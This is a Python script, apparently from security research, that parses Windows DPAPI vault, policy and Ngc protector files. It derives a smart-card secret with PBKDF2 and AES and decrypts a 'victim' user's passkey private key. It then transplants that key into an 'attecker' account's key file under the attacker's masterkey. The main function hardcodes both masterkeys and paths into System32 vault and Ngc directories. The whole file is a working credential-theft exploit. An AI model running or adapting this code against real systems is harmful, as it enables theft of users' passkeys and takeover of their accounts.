import optparse, os, sys, time, hashlib, binascii, base64, hmac, struct
from Crypto.Cipher import AES

from tqdm import tqdm
from util import Blob



class Passkey():
    def __init__(self) -> None:
        self.pk_entropy = b"xT5rZW5qVVbrvpuA\x00"
        self.pkp_entropy =  b'6jnkd5J3ZdQDtrsu\x00'
        
    
    def get_blob_guid(self, blob: Blob) -> str:
        return blob.mkguid.encode()
    
    
    def hexstring_to_byte(self, data: str) -> bytes:
        return bytes.fromhex(data.replace(" ", ""))
    
    
    def byte_to_string_00(self, data: bytes) -> bytes:
        result = []
        for char in data.hex().upper():
            result.append(bytes([ord(char)]))
            result.append(b"\x00")
        return b''.join(result)
    
    
    def string_00_to_byte(self, data: bytes) -> bytes:
        temp = []
        result = []
        
        data = data.hex().upper().replace(" ", "")
        for i in range(0, len(data), 4):
            temp.append(bytes.fromhex(data[i]+data[i+1]).hex())
            
        for i in range(0, len(temp), 2):
            if temp[i] == "00":
                continue
            result.append(int((bytes.fromhex(temp[i])+bytes.fromhex(temp[i+1])).decode("ascii"), 16).to_bytes(1))
        return b''.join(result)
    
    
    def reverse_byte(self, data: bytes) -> bytes:
        reverse_data = ''
        data_hex = data.hex()
        for x in range(-1, -len(str(data_hex)), -2): 
            reverse_data += data_hex[x-1] + data_hex[x]
        return bytes.fromhex(reverse_data)
        
        
    def get_KDBM_key(self, data: bytes) -> bytes:
        if data[:4].decode("utf-8") != "KDBM":
            print("Data is not KDBM")
            return None
        key_len = int(self.reverse_byte(data[8:12]).hex(), 16)
        return data[12:12+key_len]
    
    
    def get_ngc_key(self, data: bytes) -> bytes:
        key_len = int(self.reverse_byte(data[100:104]).hex(), 16)
        kdbm_key = self.string_00_to_byte(data[104:104+key_len])
        return self.get_KDBM_key(kdbm_key)


    def key_file_preprocessing(self, data: bytes) -> tuple[bytes, str, list]:
        info_len = int(self.reverse_byte(data[8:12]).hex(), 16)
        blob_num = int(self.reverse_byte(data[14:16]).hex(), 16)
        info = data[44:44+info_len].decode('UTF-16LE',errors='ignore')
        
        b_temp = data[44+info_len:]
        header = data[:44+info_len]
        blobs = []
        for i in range(0,blob_num):
            blob_len = int(self.reverse_byte(data[16+(4*i):16+(4*i)+4]).hex(), 16)
            blob = b_temp[:blob_len]
            blobs.append(blob)
            b_temp = b_temp[blob_len:]
            
        return (header, info, blobs)
    
    
    def vault_file_preprocessing(self, data: bytes) -> tuple[bytes, bytes]:
        iv = data[173:189]
        blob = data[189:477]
        return (iv, blob)
    
    
    def policy_file_preprocessing(self, data: bytes, masterkey: bytes) -> tuple[bool, bytes]:
        policy = Blob(data[92:])
        policy.decrypt(masterkey)
        if not policy.decrypted:
            return (False, None)
        vault_key = self.get_KDBM_key(policy.cleartext[52:])
        return (True, vault_key)
    
    
    def ngc_file_preprocessing(self, data: bytes) -> tuple[bytes, bytes]:
        nonce = data[20:32]
        blob_len = int(self.reverse_byte(data[12:16]).hex(), 16)
        blob = data[32:32+blob_len]
        return (nonce, blob)
    
    
    def save_key_file(self, path: str, header: bytes, blobs: list[Blob]) -> bool:
        try:
            data = header + blobs[0] + blobs[1].raw + blobs[2].raw
            with open(path, "wb") as f:
                f.write(data)
        except Exception as e:
            print(f"Failed to Save Key File!\n{e}")
            return False
        return True                 
    
    
    def read_key(self, path: str) -> tuple[bool, bytes, bytes, bytes, bytes]:
        try:
            with open(path, "rb") as f:
                data = f.read()
                header, info, blobs = self.key_file_preprocessing(data)
                blobs[1] = Blob(blobs[1])
                blobs[2] = Blob(blobs[2])
        except Exception as e:
            print(f"Failed to read Key File!\n{e}")
            return (False, None, None, None)
        return (True, header, info, blobs)
    
    
    def read_vault(self, path: str) -> tuple[bool, bytes, bytes]:
        try:
            with open(path, "rb") as f:
                data = f.read()
                iv, blob = self.vault_file_preprocessing(data)
        except Exception as e:
            print(f"Failed to read Vault File!\n{e}")
            return (False, None, None)
        return (True, iv, blob)
    
    
    def read_policy(self, path: str, masterkey: bytes) -> tuple[bool, bytes]:
        try:
            with open(path, "rb") as f:
                data = f.read()
                is_decrypt, vault_key = self.policy_file_preprocessing(data, masterkey)
                if not is_decrypt:
                    raise ValueError("Policy File has not been decrypted")
        except Exception as e:
            print(f"Failed to read Policy File!\n{e}")
            return (False, None)
        return (True, vault_key)
    
    
    def read_ngc(self, path) -> tuple[bool, bytes, bytes]:
        try:
            with open(path, "rb") as f:
                data = f.read()
                nonce, blob = self.ngc_file_preprocessing(data)
        except Exception as e:
            print(f"Failed to read Ngc File!\n{e}")
            return (False, None, None)
        return (True, nonce, blob)
            
            
    def pbkdf2(self, password: bytes, salt: bytes, iter: int =10000, key_len: int =32, hash_name: str="sha256") -> tuple[bool, bytes]:
        try:
            hash_len = hashlib.new(hash_name).digest_size
            def F(block_num, iter, hash_name):
                hash = hmac.new(password, salt + struct.pack('>I', block_num), hash_name).digest()
                temp = hash
                for _ in range(1, iter):
                    hash = hmac.new(password, hash, hash_name).digest()
                    temp = bytes(x ^ y for x, y in zip(temp, hash))
                return temp
                    
            block_len = -(-key_len//hash_len)
            derived_key = b"".join(F(block_num, iter, hash_name) for block_num in range(1, block_len+1))
        except Exception as e:
            print(f"Failed to generate PBKDF2 hash!\n{e}")
            return (False, None)
        return (True, derived_key[:key_len])
    
    
    def decrypt_aes_cbc(self, key: bytes, iv: bytes, data: bytes) -> tuple[bool, bytes]:
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypt_data = cipher.decrypt(data)
        except Exception as e:
            print(f"Failed to decrypt AES CBC!\n{e}")
            return (False, None)
        return (True, decrypt_data)
    
    
    def decrypt_aes_gcm(self, key: bytes, nonce: bytes, data: bytes) -> tuple[bool, bytes]:
        try:
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypt_data = cipher.decrypt(data)
        except Exception as e:
            print(f"Failed to decrypt AES GCM!\n{e}")
            return (False, None)
        return (True, decrypt_data)
    
    
    def decrypt_vault(self, key: bytes, iv: bytes, blob: bytes) -> tuple[bool, bytes]:
        try: 
            check, vault_data = self.decrypt_aes_cbc(key, iv, blob)
            if not check:
                raise ValueError("Decrypt Vault Error")
            ngc_key = self.get_ngc_key(vault_data)
        except Exception as e:
            return (False, None)
        return (True, ngc_key)
    
    
    def decrypt_ngc(self, key: bytes, nonce: bytes, blob: bytes) -> tuple[bool, bytes]:
        try:
            check, ngc_data = self.decrypt_aes_gcm(key, nonce, blob)
            if not check:
                raise ValueError("Decrypt Ngc Error")
            seed = ngc_data[-32:]
        except Exception as e:
            print(f"Failed to decrypt Ngc!\n{e}")
            return (False, None)
        return (True, seed)
    
    
    def get_smart_card_secret(self, seed: bytes, salt: bytes) -> tuple[bool, bytes]:
        try:
            seed = self.byte_to_string_00(seed)
            check, data = self.pbkdf2(seed, salt)
            if not check:
                raise ValueError("Get Smart Card Key Error")
            data = self.byte_to_string_00(data)
            hash = hashlib.sha512(data).digest()
        except Exception as e:
            print(f"Failed to get Smart Card Secret!\n{e}")
            return (False, None)
        return (True, hash)
    
    
    def decrypt_private_key(self, masterkey: bytes, blobs: list[Blob], seed: bytes) -> tuple[bool, bytes]:
        blobs[1].decrypt(masterkey, entropy = self.pkp_entropy)
        if not blobs[1].decrypted:
            return (False, None)
        salt = blobs[1].cleartext[286:290]
        check, smart_card_secret = self.get_smart_card_secret(seed, salt)
        if not check:
            return (False, None)
        blobs[2].decrypt(masterkey, entropy=self.pk_entropy, smartCardSecret=smart_card_secret)
        return (blobs[2].decrypted, blobs)
        
        
    def encrypt_private_key(self, masterkey: bytes, blobs: list[Blob], seed: bytes) -> tuple[bool, list[Blob]]:
        blobs[1].decrypt(masterkey, entropy = self.pkp_entropy)
        salt = blobs[1].cleartext[286:290]
        check, smart_card_secret = self.get_smart_card_secret(seed, salt)
        if not check:
            return (False, None)
        check, smart_card_secret = self.get_smart_card_secret(seed, salt)
        blobs[2].encrypt(masterkey, entropy=self.pk_entropy, smartCardSecret=smart_card_secret)
        return (blobs[2].encrypted, blobs)
    
    
    def decrypt(self, masterkey: bytes, key_path: str, vault_path: str, policy_path: str, ngc_path: str) -> tuple[bool, list[Blob]]:
        check, _, _, key_blobs = self.read_key(key_path)
        print(f"[*] Read Key:\t\t\t{check}")
        if not check:
            return (False, None)
        
        check, vault_iv, vault_blob = self.read_vault(vault_path)
        print(f"[*] Read Vault:\t\t\t{check}")
        if not check:
            return (False, None)
        
        check, vault_key = self.read_policy(policy_path, masterkey)
        print(f"[*] Read Policy:\t\t{check}")
        if not check:
            return (False, None)
        
        check, nonce, ngc_blob = self.read_ngc(ngc_path)
        print(f"[*] Read Ngc:\t\t\t{check}")
        if not check:
            return (False, None)
        check, ngc_key = self.decrypt_vault(vault_key, vault_iv, vault_blob)
        print(f"[*] Decrypt Vault:\t\t{check}")
        if not check:
            return (False, None)
        
        check, seed = self.decrypt_ngc(ngc_key, nonce, ngc_blob)
        print(f"[*] Decrypt Ngc:\t\t{check}")
        if not check:
            return (False, None)
        
        check, blobs = self.decrypt_private_key(masterkey, key_blobs, seed)
        print(f"[*] Decrypt Private Key:\t{check}")
        if not check:
            return (False, None)
        return (True, blobs)
    
    
    def change_key(self, masterkey: bytes, blobs: list[Blob], key_path: str, new_key_path: str, vault_path: str, policy_path: str, ngc_path: str) -> bool:
        check, header, _, victim_blobs = self.read_key(key_path)
        print(f"[*] Read Key:\t\t\t{check}")
        if not check:
            return False
        check, vault_iv, vault_blob = self.read_vault(vault_path)
        print(f"[*] Read Vault:\t\t\t{check}")
        if not check:
            return False
        check, vault_key = self.read_policy(policy_path, masterkey)
        print(f"[*] Read Policy:\t\t{check}")
        if not check:
            return False
        check, nonce, ngc_blob = self.read_ngc(ngc_path)
        print(f"[*] Read Ngc:\t\t\t{check}")
        if not check:
            return False
        check, ngc_key = self.decrypt_vault(vault_key, vault_iv, vault_blob)
        print(f"[*] Decrypt Vault:\t\t{check}")
        if not check:
            return False
        check, seed = self.decrypt_ngc(ngc_key, nonce, ngc_blob)
        print(f"[*] Decrypt Ngc:\t\t{check}")
        if not check:
            return False
        
        victim_blobs[0] = victim_blobs[0][:64] + blobs[0][64:]
        print(f"[*] Change Public Key:\t\t{True}")
        victim_blobs[2].cleartext = blobs[2].cleartext
        victim_blobs[2].blob = blobs[2].blob
        check, victim_blobs = self.encrypt_private_key(masterkey, victim_blobs, seed)
        check, _ = self.decrypt_private_key(masterkey, victim_blobs, seed)
        print(f"[*] Change Private Key:\t\t{check}")
        if not check:
            return False
        check = self.save_key_file(new_key_path, header, victim_blobs)
        print(f"[*] Save Key File:\t\t{check}")
        if not check:
            return False
        
        return True

    
    
def main():
    passkey = Passkey()

    victim_masterkey = passkey.hexstring_to_byte("3675c2798a7ea01cf98b3f9d62b8f0c0cd104873ae39a7b13e28bbc412a77a834e9bcf761d79ec83734e3579c251ed7c18c5c35e3d0fb6bfc0caacf4c3d0f9e2")
    victim_key_path = "C:\\Users\\pea04\\01.dpapi\\passkey\\victim"
    victim_vault_path = "C:\\Users\\pea04\\01.dpapi\\passkey\\victim_vault.vcrd"
    victim_policy_path = "C:\\Users\\pea04\\01.dpapi\\passkey\\victim_policy.vpol"
    victim_ngc_path = "C:\\Users\\pea04\\01.dpapi\\passkey\\15.dat"

    attecker_masterkey = passkey.hexstring_to_byte("54618e44d63a82ac21df074f38a4aa4864dec5be2687710a1d6bf46de9728559044f762ff2193076d6dc48b60995c4465466938b852a21801f487d2c00a9778a")
    attecker_key_path = "C:\\Users\\pea04\\01.dpapi\\passkey\\attecker"
    attecker_vault_path = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\\425F7E033C7B208CE9CE3AAD1187085AE72F9889.vcrd"
    attecker_policy_path = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\\Policy.vpol"
    attecker_ngc_path = "C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Ngc\\{2148CCC2-99D3-467C-A445-469F177CAD7A}\\Protectors\\2\\15.dat"
    
    new_key_path = "C:\\Users\\pea04\\01.dpapi\\passkey\\new"
    
    print("-----DECRYPT VICTIM KEY-----")
    check, data = passkey.decrypt(victim_masterkey, victim_key_path, victim_vault_path, victim_policy_path, victim_ngc_path)
    if not check:
        print("Failed Decrypt")
    print("\n")
    
    print("-----CHANGE KEY-----")
    check = passkey.change_key(attecker_masterkey, data, attecker_key_path, new_key_path, attecker_vault_path, attecker_policy_path, attecker_ngc_path)
    if not check:
        print("Failed Change Key")
    print("\n")
    
    print("-----DECRYPT NEW KEY-----")
    check, _ = passkey.decrypt(attecker_masterkey, new_key_path, attecker_vault_path, attecker_policy_path, attecker_ngc_path)
    if not check:
        print("Failed Decrypt")
    print("\n")
            
         
            
if __name__=="__main__":
    main()
    # key name = ec841e03fbc93c1e0f67553d2bbf48f7_e55ea0d1-4202-4dfa-be89-e3498a73b166
    
